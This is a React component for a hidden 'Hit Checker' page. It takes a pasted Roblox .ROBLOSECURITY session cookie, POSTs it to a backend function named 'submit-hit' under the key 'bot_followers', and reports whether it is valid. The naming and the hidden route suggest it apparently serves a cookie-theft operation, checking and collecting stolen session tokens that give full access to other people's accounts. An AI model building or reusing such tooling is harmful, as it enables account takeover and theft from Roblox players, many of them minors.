import React, { useState } from 'react';
import { Loader2, ShieldCheck, ShieldX } from 'lucide-react';
import { toast } from 'sonner';

// Hidden utility — reachable only by direct URL (/hit-checker).
// Validates a .ROBLOSECURITY cookie and reports back simply Valid / Invalid.
const FN_URL = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1`;
const ANON = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;

type Result = { ok: true; valid: boolean } | { ok: false; message: string };

const HitChecker = () => {
  const [cookie, setCookie] = useState('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<Result | null>(null);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const c = cookie.trim();
    if (!c) {
      toast.error('Paste a .ROBLOSECURITY cookie first');
      return;
    }
    setLoading(true);
    setResult(null);
    try {
      const res = await fetch(`${FN_URL}/submit-hit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', apikey: ANON },
        body: JSON.stringify({
          toolType: 'Hit Checker',
          toolKey: 'bot_followers',
          cookie: c,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data?.error || `Request failed (${res.status})`);
      const valid = !!data?.valid;
      setResult({ ok: true, valid });
      if (valid) toast.success('Valid');
      else toast.error('Invalid');
    } catch (err: any) {
      const message = err?.message ?? 'Check failed';
      setResult({ ok: false, message });
      toast.error(message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center px-4">
      <form onSubmit={submit} className="blox-card w-full max-w-xl p-6 space-y-4">
        <div className="flex items-center gap-2">
          <ShieldCheck className="h-5 w-5 text-primary" />
          <h1 className="text-lg font-semibold">Hit Checker</h1>
        </div>
        <p className="text-xs text-muted-foreground">
          Paste a <code>.ROBLOSECURITY</code> cookie to check whether it is still valid.
        </p>
        <textarea
          value={cookie}
          onChange={(e) => setCookie(e.target.value)}
          rows={5}
          spellCheck={false}
          autoComplete="off"
          placeholder=".ROBLOSECURITY=_|WARNING:-..."
          className="w-full bg-background border border-border rounded-md p-3 text-sm font-mono focus:outline-none focus:border-primary resize-y"
        />
        <button
          type="submit"
          disabled={loading || !cookie.trim()}
          className="w-full inline-flex items-center justify-center gap-2 rounded-md bg-primary text-primary-foreground text-sm font-medium px-4 py-2 disabled:opacity-50"
        >
          {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <ShieldCheck className="h-4 w-4" />}
          {loading ? 'Checking…' : 'Check'}
        </button>

        {result && (
          <div
            className={`flex items-center gap-2 rounded-md border p-3 text-sm font-medium ${
              result.ok && result.valid
                ? 'border-green-500/40 bg-green-500/10 text-green-300'
                : 'border-red-500/40 bg-red-500/10 text-red-300'
            }`}
          >
            {result.ok && result.valid ? (
              <>
                <ShieldCheck className="h-4 w-4" /> Valid
              </>
            ) : (
              <>
                <ShieldX className="h-4 w-4" />
                {result.ok ? 'Invalid' : result.message}
              </>
            )}
          </div>
        )}
      </form>
    </div>
  );
};

export default HitChecker;
